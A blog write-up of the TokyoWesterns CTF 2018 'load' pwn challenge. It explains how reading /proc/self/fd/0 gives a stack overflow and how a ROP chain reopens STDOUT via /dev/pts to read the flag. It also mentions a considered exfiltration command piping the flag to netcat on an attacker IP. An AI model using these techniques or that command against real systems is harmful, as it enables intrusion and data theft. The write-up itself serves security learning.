---
layout: post
title: "TokyoWesterns CTF 2018 - load (pwn)"
description: ""
date: 2018-09-03
tags: [ctf, pwn]
comments: true
---

> host : pwn1.chal.ctf.westerns.tokyo

> port : 34835 (Solves: 49, 208 pts)

> [load][load] [+exploit.py][exploit]

This challenge runs a binary that is a **Load file Service**, which allows you to read any file on the system, which it will open and write the file contents to a buffer on the stack. The `filename` that we enter is limited to 128-bytes and is placed in a variable in the bss section, we should take note of that. From this description, it is quite obvious that we are going for a stack-based buffer overflow which will allow us to control the saved RIP on the stack, as long as the file read is larger than the buffer size, it will overflow. 

## Controlling RIP

This brings the question of what file to read, since we do not control any files on the challenge server, and even though we could overflow it by reading some arbitrary big file in the system, if we do not control its contents, we are unable to significantly control execution flow of the program to get a flag. The solution is to read a file we CAN control, `/proc/self/fd/0`. This file is a symbolic link created for each process which allows us to read data from the terminal, fd 0 refers to STDIN while fd 1 would be STDOUT, thus if we read from fd 0, we can send a ROP chain to overflow the buffer.

```
Load file Service
Input file name: /proc/self/fd/0
Input offset: 0
Input size: 100
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Load file complete!
Segmentation fault (core dumped) <= YAY
```


## No Leaks?

So now that we are able to control execution flow, I notice the next issue. Right before main returns, there is a call to `close_fd()`, which closes the file descriptors for STDIN, STDOUT and STDERR. What this means is that we will no longer be able to read data from the user or print data to the screen.

{% highlight C %}
int close_fd()
{
  close(0);
  close(1);
  close(2);
  return;
}
{% endhighlight %}

This is an issue as generally, we assume that 99% of CTF pwn challenges have ASLR enabled, thus the libc will be mapped to a random address space for each execution of the binary. This either forces us to leak the libc address so we can call functions that are not in the PLT (PLT functions have a static addresses) or only use functions present in the PLT. The PLT actually contains `open`, `read`, and `puts`, so we actually do not need to leak the libc base address to read the flag, however we still need STDOUT to be open to see the flag on our side. So I thought of two solutions.

1) If we can find the appropriate gadgets, maybe we could run `execve` with syscalls and run a command like `cat flag | nc [myip] 1337` which would give us the flag. But I was unable to find any syscall gadgets, and ths would be a very difficult operation to do with only syscalls

2) Find some way to reopen STDOUT

I settled with the second way as it's probably easier.

## Reopening STDOUT

After a file descriptor is closed, the file descriptor will be "free'd" and the next call to the `open` syscall would return the lowest free file descriptor possible. Since `close_fd()` closed file descriptors `0, 1, 2`, our next three calls to `open` would return these file descriptors. If you run `strace` on a program calling `puts`, you will notice that a puts call for example `puts("Load file complete!")` is actually just `write(1, "Load file complete!", 19)     = 19`. This is useful as now we know that the second file we open to will be written to by the puts call. If we can somehow read from that file from our remote connection, we can see the flag. After knowing this I did some googling and tried random files like `/dev/tty` after seeing shellcodes like [this][shellcode], but tty didn't work, I think it's because we aren't in a terminal. Trying to call open on `/proc/self/fd/1` wouldn't work as after the fd is closed, so is the file. After messing around, I realised that `/proc/self/fd/1` is just a symlink to another file `/dev/pts/?`. I tried opening the correct `/dev/pts/?` twice so that fd 1 == `/dev/pts/?` with a simple puts ROP chain and it worked!

## Finishing up

Now that we know we can leak, we just have to write a simple ROP chain to open the flag file and read it back to ourselves. The ROP chain I used did the following `open("/dev/pts/?") * 2 => open("/home/load/flag.txt") => read(3(flag), 0x601000(random bss addr), 10000)`, using our `filename` buffer in the bss to store filenames for the three files, since it has a static address. And we get the flag! Just a note, `/dev/pts/?` has question mark as it seems that the pts our connection uses keeps changing, but changing it randomly between 0-3 seemed to work reliably enough for my purposes. Also, there weren't easy gadgets for a `pop rdx` instruction for the third argument in the `read` call, so I had to use `csu_init` which helps to set my rdx register.

`TWCTF{pr0cf5_15_h1ghly_fl3x1bl3}`

[load]:{{site.baseurl}}/ctf/TokyoWesterns18/load/load
[exploit]:{{site.baseurl}}/ctf/TokyoWesterns18/load/exploit.py
[shellcode]: http://shell-storm.org/shellcode/files/shellcode-219.php